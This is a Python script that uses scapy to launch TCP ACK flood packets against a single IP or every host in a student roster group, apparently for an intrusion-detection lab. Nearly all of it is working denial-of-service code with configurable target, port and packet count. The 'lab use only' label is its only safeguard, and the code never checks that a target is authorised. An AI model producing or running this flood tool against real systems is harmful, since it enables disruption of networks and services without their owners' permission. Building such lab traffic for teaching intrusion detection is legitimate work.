import json
import argparse
import random
import time
import os
import sys

# Import scapy only when available
try:
    from scapy.all import IP, TCP, send
except ImportError:
    IP = TCP = send = None


def load_roster(path):
    """Read and decode a JSON roster file into a dictionary."""
    with open(path, 'r') as f:
        return json.load(f)


def ack_flood(dest_ip, dest_port, packet_count=1000):
    """Send a burst of TCP ACK packets to the specified target."""
    if IP is None:
        print("Scapy is required to send packets.")
        return

    for _ in range(packet_count):
        src_port = random.randint(1024, 65535)
        pkt = IP(dst=dest_ip) / TCP(
            sport=src_port,
            dport=dest_port,
            flags="A"
        )
        send(pkt, verbose=False)
        time.sleep(0.01)


def attack_group(group_name, roster, port, count):
    if group_name not in roster:
        print("Group not found:", group_name)
        return

    group = roster[group_name]
    for student, ip in group.items():
        ack_flood(ip, port, packet_count=count)


def main():
    parser = argparse.ArgumentParser(description="ACK flood launcher (lab use only)")

    parser.add_argument(
        "--roster",
        default="ids_sec3_students.json",
        help="Roster JSON file"
    )

    parser.add_argument("--target-group", help="Group name (e.g., group1)")
    parser.add_argument("--target-ip", help="Single IP (e.g., 192.168.2.26)")
    parser.add_argument("--port", type=int, default=5555)
    parser.add_argument("--count", type=int, default=1000)

    args = parser.parse_args()

    # Root check (Linux/macOS)
    if IP is not None and hasattr(os, "geteuid"):
        if os.geteuid() != 0:
            print("Run as root to send packets.")
            sys.exit(1)

    roster = {}

    if args.target_group:
        if not os.path.exists(args.roster):
            print("Roster file not found:", args.roster)
            return
        roster = load_roster(args.roster)

    if args.target_ip:
        ack_flood(args.target_ip, args.port, packet_count=args.count)

    if args.target_group:
        attack_group(args.target_group, roster, port=args.port, count=args.count)

    if not args.target_ip and not args.target_group:
        print("Use --target-group <name> or --target-ip <ip>")


if __name__ == "__main__":
    main()